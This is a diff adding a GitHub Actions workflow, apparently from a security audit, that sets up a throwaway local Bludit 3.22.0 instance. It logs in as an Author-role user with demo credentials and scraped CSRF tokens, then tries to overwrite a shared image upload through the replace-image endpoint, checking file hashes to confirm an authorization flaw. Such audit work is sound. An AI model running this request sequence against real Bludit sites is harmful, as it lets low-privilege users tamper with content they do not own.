@@ -1,0 +1,114 @@
+name: Bludit shared image replacement authorization proof
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - security-audit/bludit-live-test
+permissions:
+  contents: read
+jobs:
+  replacement:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Checkout upstream Bludit 3.22.0
+        uses: actions/checkout@v4
+        with:
+          repository: bludit/bludit
+          ref: 3.22.0
+          path: bludit
+      - uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.3'
+          extensions: gd, mbstring, xml, zip, fileinfo
+          coverage: none
+      - name: Install disposable instance and test Author replacement
+        shell: bash
+        run: |
+          set -euo pipefail
+          ROOT="$GITHUB_WORKSPACE/bludit"
+          BASE="http://127.0.0.1:8080"
+          cat >/tmp/router.php <<'PHP'
+          <?php
+          $root = getenv('BLUDIT_ROOT');
+          $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+          if ($path !== '/' && is_file($root . $path)) return false;
+          $_SERVER['DOCUMENT_ROOT'] = $root;
+          $_SERVER['SCRIPT_NAME'] = '/index.php';
+          $_SERVER['PHP_SELF'] = '/index.php';
+          require $root . '/index.php';
+          PHP
+          export BLUDIT_ROOT="$ROOT"
+          php -S 127.0.0.1:8080 -t "$ROOT" /tmp/router.php >/tmp/bludit-replace-server.log 2>&1 &
+          SERVER_PID=$!
+          trap 'kill "$SERVER_PID" 2>/dev/null || true' EXIT
+          READY=0
+          for i in $(seq 1 60); do
+            if curl -sS "$BASE/install.php" >/dev/null 2>&1; then READY=1; break; fi
+            sleep 1
+          done
+          test "$READY" = 1
+          curl -fsS "$BASE/install.php?demo=true" >/dev/null
+          test -f "$ROOT/bl-content/databases/users.php"
+          php -r '
+          $p=$argv[1]; $s=file_get_contents($p); $i=strpos($s,"?>");
+          if($i===false) exit(2);
+          $prefix=substr($s,0,$i+2); $d=json_decode(substr($s,$i+2),true);
+          if(!is_array($d)||!isset($d["admin"])) exit(3);
+          $d["admin"]["role"]="author";
+          file_put_contents($p,$prefix.PHP_EOL.json_encode($d,JSON_PRETTY_PRINT));
+          ' "$ROOT/bl-content/databases/users.php"
+          JAR=/tmp/author-cookie.jar
+          curl -sS -c "$JAR" -b "$JAR" "$BASE/admin/login" -o /tmp/login.html
+          CSRF=$(python3 - <<'PY'
+          import re
+          s=open('/tmp/login.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )
+          test -n "$CSRF"
+          LOGIN_CODE=$(curl -sS -o /tmp/login-response.html -w '%{http_code}' -c "$JAR" -b "$JAR" --data-urlencode 'username=admin' --data-urlencode 'password=demo123' --data-urlencode "tokenCSRF=$CSRF" "$BASE/admin/login")
+          echo "Author login HTTP: $LOGIN_CODE"
+          [[ "$LOGIN_CODE" == "301" || "$LOGIN_CODE" == "302" ]]
+          curl -sS -b "$JAR" -c "$JAR" "$BASE/admin/new-content" -o /tmp/author-page.html
+          CSRF=$(python3 - <<'PY'
+          import re
+          s=open('/tmp/author-page.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )
+          test -n "$CSRF"
+          mkdir -p "$ROOT/bl-content/uploads"
+          php -r '$im=imagecreatetruecolor(8,8); imagefill($im,0,0,imagecolorallocate($im,220,20,60)); imagepng($im,$argv[1]); imagedestroy($im);' /tmp/original.png
+          php -r '$im=imagecreatetruecolor(8,8); imagefill($im,0,0,imagecolorallocate($im,20,80,220)); imagepng($im,$argv[1]); imagedestroy($im);' /tmp/replacement.png
+          cp /tmp/original.png "$ROOT/bl-content/uploads/audit-shared-replace.png"
+          BEFORE=$(sha256sum "$ROOT/bl-content/uploads/audit-shared-replace.png" | cut -d' ' -f1)
+          CODE=$(curl -sS -o /tmp/replace-response.json -w '%{http_code}' -b "$JAR" -c "$JAR" -X POST --data-urlencode "tokenCSRF=$CSRF" --data-urlencode 'filename=audit-shared-replace.png' -F 'image=@/tmp/replacement.png;type=image/png' "$BASE/admin/ajax/replace-image")
+          AFTER=$(sha256sum "$ROOT/bl-content/uploads/audit-shared-replace.png" | cut -d' ' -f1)
+          echo "Replacement HTTP: $CODE"
+          cat /tmp/replace-response.json || true
+          echo "Before SHA256: $BEFORE"
+          echo "After SHA256:  $AFTER"
+          if [[ "$CODE" == "200" && "$BEFORE" != "$AFTER" ]]; then
+            echo "CONFIRMED: Author replaced shared global upload on upstream Bludit 3.22.0"
+          elif [[ "$BEFORE" == "$AFTER" ]]; then
+            echo "NOT REPRODUCED: shared upload remained unchanged"
+          else
+            echo "INCONCLUSIVE: unexpected HTTP status or server response"
+            exit 1
+          fi
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bludit-shared-image-replacement-proof
+          path: |
+            /tmp/bludit-replace-server.log
+            /tmp/replace-response.json
+            /tmp/login.html
+            /tmp/author-page.html
+          if-no-files-found: warn
